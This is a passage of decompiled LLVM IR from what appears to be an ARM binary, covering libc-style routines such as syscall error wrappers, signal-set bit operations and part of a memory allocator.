  %v2_11468 = inttoptr i32 %v0_11460 to i32*
  store i32 %v1_11464, i32* %v2_11468, align 4
  br label %dec_label_pc_11470

dec_label_pc_11470:                               ; preds = %dec_label_pc_1143c, %dec_label_pc_11460
  %v1_11478 = phi i32 [ %arg1, %dec_label_pc_1143c ], [ -1, %dec_label_pc_11460 ]
  ret i32 %v1_11478

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11470, { 1, 0 }
}

define i32 @function_11480(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11480:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11480 = load i32, i32* @r7, align 4
  store i32 %v3_11480, i32* %stack_var_-8, align 4
  %v0_1148c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1148c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1148c, -4095
  br i1 %tmp, label %dec_label_pc_114ac, label %dec_label_pc_1149c

dec_label_pc_1149c:                               ; preds = %dec_label_pc_11480
  %v0_1149c = call i32 @function_11200()
  %v0_114a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_114a0 = sub i32 0, %v0_114a0
  %v2_114a4 = inttoptr i32 %v0_1149c to i32*
  store i32 %v1_114a0, i32* %v2_114a4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_114ac.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_114ac

dec_label_pc_114ac:                               ; preds = %dec_label_pc_11480, %dec_label_pc_1149c
  %v1_114b0 = phi i32 [ %v0_1148c, %dec_label_pc_11480 ], [ -1, %dec_label_pc_1149c ]
  %v2_114ac = phi i32 [ %v3_11480, %dec_label_pc_11480 ], [ %v2_114ac.pre, %dec_label_pc_1149c ]
  store i32 %v2_114ac, i32* @r7, align 4
  ret i32 %v1_114b0

; uselistorder directives
  uselistorder i32 %v0_1148c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_114ac, { 1, 0 }
}

define i32 @function_114b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_114b4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_114b4 = load i32, i32* @r7, align 4
  store i32 %v3_114b4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_114dc, label %dec_label_pc_114cc

dec_label_pc_114cc:                               ; preds = %dec_label_pc_114b4
  %v0_114cc = call i32 @function_11200()
  %v0_114d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_114d0 = sub i32 0, %v0_114d0
  %v2_114d4 = inttoptr i32 %v0_114cc to i32*
  store i32 %v1_114d0, i32* %v2_114d4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_114e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_114dc

dec_label_pc_114dc:                               ; preds = %dec_label_pc_114b4, %dec_label_pc_114cc
  %v2_114e0 = phi i32 [ %v3_114b4, %dec_label_pc_114b4 ], [ %v2_114e0.pre, %dec_label_pc_114cc ]
  %v0_114dc = phi i32 [ %arg1, %dec_label_pc_114b4 ], [ -1, %dec_label_pc_114cc ]
  store i32 %v2_114e0, i32* @r7, align 4
  ret i32 %v0_114dc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_114dc, { 1, 0 }
}

define i32 @function_114ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_114ec:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_114ec = load i32, i32* @r4, align 4
  store i32 %v3_114ec, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1151c, label %dec_label_pc_1150c

dec_label_pc_1150c:                               ; preds = %dec_label_pc_114ec
  %v0_1150c = call i32 @function_11200()
  %v0_11510 = load i32, i32* %r4.global-to-local, align 4
  %v1_11510 = sub i32 0, %v0_11510
  %v2_11514 = inttoptr i32 %v0_1150c to i32*
  store i32 %v1_11510, i32* %v2_11514, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11520.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_1151c

dec_label_pc_1151c:                               ; preds = %dec_label_pc_114ec, %dec_label_pc_1150c
  %v2_11520 = phi i32 [ %v3_114ec, %dec_label_pc_114ec ], [ %v2_11520.pre, %dec_label_pc_1150c ]
  %v0_1151c = phi i32 [ %arg1, %dec_label_pc_114ec ], [ -1, %dec_label_pc_1150c ]
  store i32 %v2_11520, i32* @r4, align 4
  ret i32 %v0_1151c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1151c, { 1, 0 }
}

define i32 @function_11528(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11528:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11528 = load i32, i32* @r7, align 4
  store i32 %v3_11528, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11550, label %dec_label_pc_11540

dec_label_pc_11540:                               ; preds = %dec_label_pc_11528
  %v0_11540 = call i32 @function_11200()
  %v0_11544 = load i32, i32* %r7.global-to-local, align 4
  %v1_11544 = sub i32 0, %v0_11544
  store i32 %v1_11544, i32* @r3, align 4
  %v2_11548 = inttoptr i32 %v0_11540 to i32*
  store i32 %v1_11544, i32* %v2_11548, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11554.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11550

dec_label_pc_11550:                               ; preds = %dec_label_pc_11528, %dec_label_pc_11540
  %v2_11554 = phi i32 [ %v3_11528, %dec_label_pc_11528 ], [ %v2_11554.pre, %dec_label_pc_11540 ]
  %v0_11550 = phi i32 [ %arg1, %dec_label_pc_11528 ], [ -1, %dec_label_pc_11540 ]
  store i32 %v2_11554, i32* @r7, align 4
  ret i32 %v0_11550

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11550, { 1, 0 }
}

define i32 @function_11560(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_11560:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11560 = load i32, i32* @r4, align 4
  store i32 %v3_11560, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11590, label %dec_label_pc_11580

dec_label_pc_11580:                               ; preds = %dec_label_pc_11560
  %v0_11580 = call i32 @function_11200()
  %v0_11584 = load i32, i32* %r4.global-to-local, align 4
  %v1_11584 = sub i32 0, %v0_11584
  %v2_11588 = inttoptr i32 %v0_11580 to i32*
  store i32 %v1_11584, i32* %v2_11588, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11594.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11590

dec_label_pc_11590:                               ; preds = %dec_label_pc_11560, %dec_label_pc_11580
  %v2_11594 = phi i32 [ %v3_11560, %dec_label_pc_11560 ], [ %v2_11594.pre, %dec_label_pc_11580 ]
  %v0_11590 = phi i32 [ %arg1, %dec_label_pc_11560 ], [ -1, %dec_label_pc_11580 ]
  store i32 %v2_11594, i32* @r4, align 4
  ret i32 %v0_11590

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11590, { 1, 0 }
}

define i32 @function_115a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_115a0:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_115d4, label %dec_label_pc_115c4

dec_label_pc_115c4:                               ; preds = %dec_label_pc_115a0
  %v0_115c4 = call i32 @function_11200()
  %v0_115c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_115c8 = sub i32 0, %v0_115c8
  store i32 %v1_115c8, i32* @r3, align 4
  %v2_115cc = inttoptr i32 %v0_115c4 to i32*
  store i32 %v1_115c8, i32* %v2_115cc, align 4
  br label %dec_label_pc_115d4

dec_label_pc_115d4:                               ; preds = %dec_label_pc_115a0, %dec_label_pc_115c4
  %v1_115dc = phi i32 [ %arg1, %dec_label_pc_115a0 ], [ -1, %dec_label_pc_115c4 ]
  ret i32 %v1_115dc

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_115d4, { 1, 0 }
}

define i32 @function_115e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_115e4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_115e4 = load i32, i32* @r7, align 4
  store i32 %v3_115e4, i32* %stack_var_-8, align 4
  %v0_115f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_115f0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_115f0, -4095
  br i1 %tmp, label %dec_label_pc_11610, label %dec_label_pc_11600

dec_label_pc_11600:                               ; preds = %dec_label_pc_115e4
  %v0_11600 = call i32 @function_11200()
  %v0_11604 = load i32, i32* %r7.global-to-local, align 4
  %v1_11604 = sub i32 0, %v0_11604
  store i32 %v1_11604, i32* @r3, align 4
  %v2_11608 = inttoptr i32 %v0_11600 to i32*
  store i32 %v1_11604, i32* %v2_11608, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11610.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11610

dec_label_pc_11610:                               ; preds = %dec_label_pc_115e4, %dec_label_pc_11600
  %v1_11614 = phi i32 [ %v0_115f0, %dec_label_pc_115e4 ], [ -1, %dec_label_pc_11600 ]
  %v2_11610 = phi i32 [ %v3_115e4, %dec_label_pc_115e4 ], [ %v2_11610.pre, %dec_label_pc_11600 ]
  store i32 %v2_11610, i32* @r7, align 4
  ret i32 %v1_11614

; uselistorder directives
  uselistorder i32 %v0_115f0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11610, { 1, 0 }
}

define i32 @function_1161c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1161c:
  store i32 %arg1, i32* @r0, align 4
  %v3_1161c = load i32, i32* @r4, align 4
  %v0_11624 = call i32 @function_10a44()
  %v2_1162c = call i32 @function_10ba4(i32 %v0_11624, i32 %arg1)
  store i32 %v3_1161c, i32* @r4, align 4
  ret i32 %v2_1162c

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_10ba4, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_10a44, { 0, 3, 2, 1 }
}

define i32 @function_11638(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11638:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_11650, label %dec_label_pc_11648

dec_label_pc_11648:                               ; preds = %dec_label_pc_11638
  %v7_1164c = icmp slt i32 %arg1, 65
  br i1 %v7_1164c, label %dec_label_pc_11664, label %dec_label_pc_11650

dec_label_pc_11650:                               ; preds = %dec_label_pc_11648, %dec_label_pc_11638
  %v0_11650 = call i32 @function_11200()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1165c = inttoptr i32 %v0_11650 to i32*
  store i32 22, i32* %v2_1165c, align 4
  %v0_1166c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1166c

dec_label_pc_11664:                               ; preds = %dec_label_pc_11648
  %v0_11664 = call i32 @function_1176c()
  store i32 %v0_11664, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1166c

dec_label_pc_1166c:                               ; preds = %dec_label_pc_11650, %dec_label_pc_11664
  %v0_1166c = phi i32 [ %v0_1166c.pre, %dec_label_pc_11650 ], [ %v0_11664, %dec_label_pc_11664 ]
  ret i32 %v0_1166c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1166c, { 1, 0 }
}

define i32 @function_1167c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1167c:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_11684 = add i32 %tmp, 4
  %v3_11684 = inttoptr i32 %v2_11684 to i32*
  store i32 0, i32* %v3_11684, align 4
  %v1_11688 = load i32, i32* %r3.global-to-local, align 4
  %v2_11688 = inttoptr i32 %v1_11688 to i32*
  store i32 0, i32* %v2_11688, align 4
  ret i32 0
}

define i32 @function_11690(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11690:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11690 = load i32, i32* @r4, align 4
  store i32 %v3_11690, i32* %stack_var_-16, align 4
  %v6_11690 = load i32, i32* @r5, align 4
  %v9_11690 = load i32, i32* @r6, align 4
  %v7_11698 = icmp eq i32 %arg2, -1
  br i1 %v7_11698, label %.thread4, label %bb

.thread4:                                         ; preds = %dec_label_pc_11690
  br label %.thread16

bb:                                               ; preds = %dec_label_pc_11690
  %v2_116a0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_116bc

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_116c4

dec_label_pc_116bc:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_116c0 = icmp slt i32 %arg1, 65
  br i1 %v7_116c0, label %dec_label_pc_116d8, label %dec_label_pc_116c4

dec_label_pc_116c4:                               ; preds = %.thread16, %dec_label_pc_116bc
  %v0_116c4 = call i32 @function_11200()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_116d0 = inttoptr i32 %v0_116c4 to i32*
  store i32 22, i32* %v2_116d0, align 4
  %v0_11730.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_116d8:                               ; preds = %dec_label_pc_116bc
  %v2_116d8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_116d8, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_116e0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_116e0, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_116f0 = call i32 @function_1176c()
  %v0_116f8 = load i32, i32* @r5, align 4
  %v2_11700 = call i32 @function_11748(i32 ptrtoint (i32* @global_var_20b88.369 to i32), i32 %v0_116f8)
  store i32 %v2_116a0, i32* %r2.global-to-local, align 4
  %v0_11718 = load i32, i32* @r5, align 4
  %v3_11720 = call i32 @function_13b7c(i32 %v0_11718, i32 %v2_116d8, i32 %v2_116a0)
  %v1_11724 = icmp slt i32 %v3_11720, 0
  br i1 %v1_11724, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_116d8
  %v5_11728 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_11728, i32* %r2.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_116d8
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_116c4, %bb32
  %v0_11730 = phi i32 [ %v5_11728, %bb31 ], [ %v0_11730.pre, %dec_label_pc_116c4 ], [ -1, %bb32 ]
  %v2_11738 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11738, i32* @r4, align 4
  store i32 %v6_11690, i32* @r5, align 4
  store i32 %v9_11690, i32* @r6, align 4
  ret i32 %v0_11730

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 ()* @function_1176c, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_116c4, { 1, 0 }
}

define i32 @function_11748(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11748:
  %v1_11748 = add i32 %arg2, -1
  %v3_1174c = udiv i32 %v1_11748, 32
  %v4_11750 = mul nuw nsw i32 %v3_1174c, 4
  %v5_11750 = add i32 %v4_11750, %arg1
  %v6_11750 = inttoptr i32 %v5_11750 to i32*
  %v7_11750 = load i32, i32* %v6_11750, align 4
  %v1_11754 = urem i32 %v1_11748, 32
  %v7_1175c = shl i32 1, %v1_11754
  %v8_1175c = and i32 %v7_11750, %v7_1175c
  %v10_1175c = icmp ne i32 %v8_1175c, 0
  %. = zext i1 %v10_1175c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_11748, { 1, 0 }
}

define i32 @function_1176c() local_unnamed_addr {
dec_label_pc_1176c:
  %v0_1176c = load i32, i32* @r1, align 4
  %v1_1176c = add i32 %v0_1176c, -1
  %v3_11770 = udiv i32 %v1_1176c, 32
  %v0_11774 = load i32, i32* @r0, align 4
  %v4_11774 = mul nuw nsw i32 %v3_11770, 4
  %v5_11774 = add i32 %v0_11774, %v4_11774
  %v6_11774 = inttoptr i32 %v5_11774 to i32*
  %v7_11774 = load i32, i32* %v6_11774, align 4
  %v1_11778 = urem i32 %v1_1176c, 32
  %v7_11780 = shl i32 1, %v1_11778
  %v8_11780 = or i32 %v7_11774, %v7_11780
  store i32 %v8_11780, i32* %v6_11774, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1176c, { 1, 0 }
}

define i32 @function_11790(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11790:
  %v1_11790 = add i32 %arg2, -1
  %v3_11794 = udiv i32 %v1_11790, 32
  %v4_11798 = mul nuw nsw i32 %v3_11794, 4
  %v5_11798 = add i32 %v4_11798, %arg1
  %v6_11798 = inttoptr i32 %v5_11798 to i32*
  %v7_11798 = load i32, i32* %v6_11798, align 4
  %v1_1179c = urem i32 %v1_11790, 32
  %tmp = shl i32 -1, %v1_1179c
  %v8_117a4 = add i32 %tmp, -1
  %v9_117a4 = and i32 %v7_11798, %v8_117a4
  store i32 %v9_117a4, i32* %v6_11798, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11790, { 1, 0 }
}

define i32 @function_117b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_117b4:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_117b4 = udiv i32 %arg1, 256
  store i32 %v3_117b4, i32* %r1.global-to-local, align 4
  %v2_117b8 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_117b8, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_117b4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_117b4, %bb
  %v0_117c4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_117b8, i32 %v0_117c4)
  %v0_117c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_117c8 = add i32 %v0_117c8, 1048320
  %v3_117cc = udiv i32 %v1_117c8, 65536
  %v1_117d0 = and i32 %v3_117cc, 8
  %v6_117d4 = shl i32 %v0_117c8, %v1_117d0
  %v1_117d8 = add i32 %v6_117d4, 520192
  %v3_117dc = udiv i32 %v1_117d8, 65536
  %v1_117e0 = and i32 %v3_117dc, 4
  %v6_117e4 = shl i32 %v6_117d4, %v1_117e0
  %v1_117e8 = add i32 %v6_117e4, 245760
  %v3_117ec = udiv i32 %v1_117e8, 65536
  %v1_117f0 = and i32 %v3_117ec, 2
  %v6_117f4 = shl i32 %v6_117e4, %v1_117f0
  store i32 %v6_117f4, i32* %r1.global-to-local, align 4
  %v1_117f8 = sub nsw i32 13, %v1_117d0
  %v2_117fc = sub nsw i32 %v1_117f8, %v1_117e0
  %v3_11800 = udiv i32 %v6_117f4, 32768
  %v4_11800 = sub nuw nsw i32 -1, %v3_11800
  %v4_11804 = udiv i32 %v6_117f4, 16384
  %v5_11804 = and i32 %v4_11804, %v4_11800
  %v2_11808 = sub nsw i32 %v2_117fc, %v1_117f0
  %v2_1180c = add nsw i32 %v2_11808, %v5_11804
  %v1_11810 = add nsw i32 %v2_1180c, 6
  %v0_11814 = load i32, i32* %ip.global-to-local, align 4
  %v6_11814 = lshr i32 %v0_11814, %v1_11810
  %v3_11818 = mul nsw i32 %v2_1180c, 4
  %v1_1181c = add nsw i32 %v3_11818, 32
  %v1_11820 = urem i32 %v6_11814, 4
  %v2_11824 = or i32 %v1_11820, %v1_1181c
  ret i32 %v2_11824

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_1182c() local_unnamed_addr {
dec_label_pc_1182c:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1182c = load i32, i32* @r4, align 4
  %v6_1182c = load i32, i32* @r5, align 4
  %v9_1182c = load i32, i32* @r6, align 4
  %v12_1182c = load i32, i32* @r7, align 4
  %v15_1182c = load i32, i32* @r8, align 4
  %v18_1182c = load i32, i32* @sb, align 4
  %v21_1182c = load i32, i32* @sl, align 4
  %v24_1182c = load i32, i32* @fp, align 4
  %v27_1182c = load i32, i32* @lr, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %r1.global-to-local, align 4
  %v4_11840 = load i32, i32* inttoptr (i32 124872 to i32*), align 8
  store i32 %v4_11840, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_1184c = load i32, i32* inttoptr (i32 124840 to i32*), align 8
  store i32 %v4_1184c, i32* %r1.global-to-local, align 4
  %v0_11850 = load i32, i32* @r0, align 4
  store i32 %v0_11850, i32* @r5, align 4
  store i32 %v4_11840, i32* %r2.global-to-local, align 4
  %v2_11858 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_11858, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %ip.global-to-local, align 4
  %v4_11864 = load i32, i32* inttoptr (i32 124876 to i32*), align 4
  store i32 %v4_11864, i32* %ip.global-to-local, align 4
  store i32 71792, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11864)
  %v0_11870 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11870, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %r1.global-to-local, align 4
  %v4_1187c = load i32, i32* inttoptr (i32 124820 to i32*), align 4
  store i32 %v4_1187c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11888.375 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1187c)
  %v0_11888 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_11888, -32
  br i1 %tmp, label %dec_label_pc_118a4, label %dec_label_pc_11890

dec_label_pc_11890:                               ; preds = %dec_label_pc_1182c
  %v0_11890 = call i32 @function_11200()
  store i32 %v0_11890, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_1189c = inttoptr i32 %v0_11890 to i32*
  store i32 12, i32* %v2_1189c, align 4
  br label %dec_label_pc_12120

dec_label_pc_118a4:                               ; preds = %dec_label_pc_1182c
  %v1_118a4 = add i32 %v0_11888, 11
  store i32 %v1_118a4, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 124804, i32* %r2.global-to-local, align 4
  %v2_118b0 = icmp ugt i32 %v1_118a4, 14
  %v7_118b0 = icmp eq i32 %v1_118a4, 15
  %v2_118b4 = xor i1 %v7_118b0, true
  %v3_118b4 = and i1 %v2_118b0, %v2_118b4
  br i1 %v3_118b4, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_118a4
  %v5_118b4 = and i32 %v1_118a4, -8
  store i32 %v5_118b4, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_118a4, %bb
  %v4_118b8 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  store i32 %v4_118b8, i32* @r0, align 4
  %v1_118bc = inttoptr i32 %v4_118b8 to i32*
  %v2_118bc = load i32, i32* %v1_118bc, align 4
  store i32 %v2_118bc, i32* @r4, align 4
  %v2_118c0 = xor i1 %v2_118b0, true
  %v3_118c0 = or i1 %v7_118b0, %v2_118c0
  br i1 %v3_118c0, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_118c4 = urem i32 %v2_118bc, 2
  %v2_118c4 = icmp eq i32 %v1_118c4, 0
  br i1 %v2_118c4, label %dec_label_pc_118cc, label %dec_label_pc_118dc

dec_label_pc_118cc:                               ; preds = %bb140
  %v2_118cc = icmp eq i32 %v2_118bc, 0
  br i1 %v2_118cc, label %dec_label_pc_118d4, label %dec_label_pc_11cb8

dec_label_pc_118d4:                               ; preds = %dec_label_pc_118cc
  %v0_118d4 = call i32 @function_126e4()
  store i32 %v0_118d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cb8

dec_label_pc_118dc:                               ; preds = %bb140
  %v0_118dc = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_118dc, %v2_118bc
  br i1 %tmp201, label %dec_label_pc_11904, label %dec_label_pc_118e4

dec_label_pc_118e4:                               ; preds = %dec_label_pc_118dc
  %v1_118e4 = add i32 %v4_118b8, -4
  store i32 %v1_118e4, i32* %r1.global-to-local, align 4
  %v3_118e8 = udiv i32 %v0_118dc, 8
  store i32 %v3_118e8, i32* %r2.global-to-local, align 4
  %v4_118ec = mul nuw i32 %v3_118e8, 4
  %v5_118ec = add i32 %v4_118ec, %v1_118e4
  %v6_118ec = inttoptr i32 %v5_118ec to i32*
  %v7_118ec = load i32, i32* %v6_118ec, align 4
  store i32 %v7_118ec, i32* %r0.global-to-local, align 4
  %v2_118f0 = icmp eq i32 %v7_118ec, 0
  br i1 %v2_118f0, label %dec_label_pc_11904, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_118e4
  %v2_118f4 = add i32 %v7_118ec, 8
  %v3_118f4 = inttoptr i32 %v2_118f4 to i32*
  %v4_118f4 = load i32, i32* %v3_118f4, align 4
  store i32 %v4_118f4, i32* %r3.global-to-local, align 4
  store i32 %v2_118f4, i32* %r0.global-to-local, align 4
  store i32 %v2_118f4, i32* %r4.global-to-local, align 4
  store i32 %v4_118f4, i32* %v6_118ec, align 4
  br label %dec_label_pc_12104

dec_label_pc_11904:                               ; preds = %dec_label_pc_118e4, %dec_label_pc_118dc
  %tmp202 = icmp ugt i32 %v0_118dc, 255
  br i1 %tmp202, label %dec_label_pc_11954, label %dec_label_pc_1190c

dec_label_pc_1190c:                               ; preds = %dec_label_pc_11904
  store i32 124804, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_11914 = load i32, i32* inttoptr (i32 124836 to i32*), align 4
  %v3_11918 = udiv i32 %v0_118dc, 8
  store i32 %v3_11918, i32* @r7, align 4
  %v4_1191c = mul nuw i32 %v3_11918, 8
  %v5_1191c = add i32 %v4_11914, %v4_1191c
  store i32 %v5_1191c, i32* %r3.global-to-local, align 4
  %v1_11920 = add i32 %v5_1191c, 44
  store i32 %v1_11920, i32* %ip.global-to-local, align 4
  %v1_11924 = add i32 %v5_1191c, 56
  %v2_11924 = inttoptr i32 %v1_11924 to i32*
  %v3_11924 = load i32, i32* %v2_11924, align 4
  store i32 %v3_11924, i32* %r0.global-to-local, align 4
  %v9_11928 = icmp eq i32 %v3_11924, %v1_11920
  br i1 %v9_11928, label %dec_label_pc_11ab4, label %dec_label_pc_11930

dec_label_pc_11930:                               ; preds = %dec_label_pc_1190c
  %v2_11930 = add i32 %v3_11924, %v0_118dc
  store i32 %v2_11930, i32* %r3.global-to-local, align 4
